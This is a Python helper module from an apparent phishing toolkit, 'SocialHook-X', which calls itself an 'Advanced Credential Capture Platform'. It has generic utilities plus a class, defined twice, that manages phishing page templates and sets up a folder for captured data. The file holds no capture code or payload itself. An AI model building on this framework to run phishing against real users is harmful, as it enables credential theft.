#!/usr/bin/env python3
"""
SocialHook-X Utilities Module
Helper functions and utilities
"""

import os
import sys
import json
import logging
import subprocess
import shutil
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import platform

# Setup logging
logger = logging.getLogger(__name__)

class Colors:
    """ANSI color codes"""
    RED = '\033[0;91m'
    GREEN = '\033[0;92m'
    YELLOW = '\033[0;93m'
    BLUE = '\033[0;94m'
    PURPLE = '\033[0;95m'
    CYAN = '\033[0;96m'
    WHITE = '\033[0;97m'
    NC = '\033[0m'

def print_header():
    """Display project header"""
    print(f"\n{Colors.CYAN}{'='*60}{Colors.NC}")
    print(f"{Colors.BLUE}")
    print("""
     ███████  ██████   ██████  ██   ██  █████  ██      ██   ██  ██████   ██████ ██   ██  
    ██       ██    ██ ██      ██  ██  ██   ██ ██      ██   ██  ██    ██ ██      ██  ██   
    ███████  ██    ██ ██      █████   ███████ ██      ███████  ██    ██ ██      █████    
         ██ ██    ██ ██      ██  ██  ██   ██ ██      ██   ██  ██    ██ ██      ██  ██   
    ███████  ██████   ██████ ██   ██ ██   ██ ███████ ██   ██  ██████   ██████ ██   ██  
                                                                                           
                    Advanced Credential Capture Platform
    """)
    print(f"{Colors.NC}")
    print(f"{Colors.GREEN}Version 4.0 | Educational Use Only{Colors.NC}")
    print(f"{Colors.CYAN}{'='*60}{Colors.NC}\n")

def print_success(msg: str):
    """Print success message"""
    print(f"{Colors.GREEN}[+]{Colors.NC} {msg}")

def print_error(msg: str):
    """Print error message"""
    print(f"{Colors.RED}[!]{Colors.NC} {msg}")

def print_info(msg: str):
    """Print info message"""
    print(f"{Colors.BLUE}[*]{Colors.NC} {msg}")

def print_warning(msg: str):
    """Print warning message"""
    print(f"{Colors.YELLOW}[!]{Colors.NC} {msg}")

def command_exists(cmd: str) -> bool:
    """Check if command exists"""
    return shutil.which(cmd) is not None

def run_command(cmd: str, shell: bool = True, timeout: int = 30) -> Tuple[bool, str]:
    """Run shell command"""
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.returncode == 0, result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return False, f"Command timeout after {timeout}s"
    except Exception as e:
        return False, str(e)

def get_os_type() -> str:
    """Get operating system type"""
    system = platform.system().lower()
    if 'linux' in system:
        return 'linux'
    elif 'darwin' in system:
        return 'macos'
    elif 'windows' in system or 'win32' in sys.platform:
        return 'windows'
    return 'unknown'

def get_architecture() -> str:
    """Get system architecture"""
    machine = platform.machine().lower()
    arch_map = {
        'x86_64': 'amd64',
        'amd64': 'amd64',
        'i386': '386',
        'i686': '386',
        'aarch64': 'arm64',
        'arm': 'arm',
        'armv7l': 'arm',
    }
    return arch_map.get(machine, machine)

def save_to_output(data: Dict, filename: str, format_type: str = 'json') -> str:
    """Save data to output file"""
    from core.config import config
    
    output_path = config.get_output_file(filename, format_type)
    
    try:
        with open(output_path, 'w') as f:
            if format_type == 'json':
                json.dump(data, f, indent=2)
            else:
                f.write(str(data))
        
        logger.info(f"Data saved to {output_path}")
        return output_path
    except Exception as e:
        logger.error(f"Failed to save output: {e}")
        return None

def load_json_file(filepath: str) -> Optional[Dict]:
    """Load JSON file"""
    try:
        with open(filepath, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load {filepath}: {e}")
        return None

def get_timestamp() -> str:
    """Get current timestamp"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def get_log_filename() -> str:
    """Generate log filename"""
    return f"capture_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

def is_valid_url(url: str) -> bool:
    """Validate URL format"""
    import re
    pattern = r'^https?://[^\s/$.?#].[^\s]*$'
    return re.match(pattern, url) is not None


class TemplateManager:
    """Manage phishing templates"""
    
    def __init__(self, templates_dir: str = "templates"):
        self.templates_dir = Path(templates_dir)
        self.available_templates = self._discover_templates()
    
    def _discover_templates(self) -> Dict[str, Path]:
        """Discover available templates"""
        templates = {}
        if self.templates_dir.exists():
            for item in self.templates_dir.iterdir():
                if item.is_dir() and (item / 'index.php').exists():
                    templates[item.name] = item
        return templates
    
    def get_template(self, name: str) -> Optional[Path]:
        """Get template directory"""
        return self.available_templates.get(name)
    
    def list_templates(self) -> List[str]:
        """List all available templates"""
        return list(self.available_templates.keys())

def sanitize_filename(filename: str) -> str:
    """Sanitize filename"""
    import re
    return re.sub(r'[^\w\s-]', '', filename).strip()

class Logger:
    """Application logger"""
    
    @staticmethod
    def setup(level=logging.INFO):
        """Setup logging configuration"""
        from core.config import config
        
        logging.basicConfig(
            level=level,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(config.LOG_FILE),
                logging.StreamHandler()
            ]
        )
        return logging.getLogger(__name__)

class TemplateManager:
    """Manage phishing templates"""
    
    def __init__(self):
        from core.config import config
        self.templates_dir = config.TEMPLATES_DIR
        self.available = config.AVAILABLE_TEMPLATES
    
    def list_templates(self) -> List[str]:
        """List available templates"""
        return list(self.available.keys())
    
    def get_template_path(self, template: str) -> Path:
        """Get template directory path"""
        return self.templates_dir / template
    
    def template_exists(self, template: str) -> bool:
        """Check if template exists"""
        path = self.get_template_path(template)
        return path.exists()
    
    def get_template_files(self, template: str) -> List[str]:
        """Get files in template directory"""
        path = self.get_template_path(template)
        if path.exists():
            return [f.name for f in path.iterdir()]
        return []

def setup_directories():
    """Ensure all required directories exist"""
    from core.config import config
    
    for directory in [
        config.TEMPLATES_DIR,
        config.SERVERS_DIR,
        config.OUTPUT_DIR,
        config.CAPTURED_DIR,
    ]:
        directory.mkdir(parents=True, exist_ok=True)
        logger.info(f"Directory ready: {directory}")

def validate_environment() -> bool:
    """Validate environment setup"""
    missing = []
    
    required_commands = ['python3', 'php', 'curl']
    for cmd in required_commands:
        if not command_exists(cmd):
            missing.append(cmd)
    
    if missing:
        print_warning(f"Missing commands: {', '.join(missing)}")
        return False
    
    setup_directories()
    return True
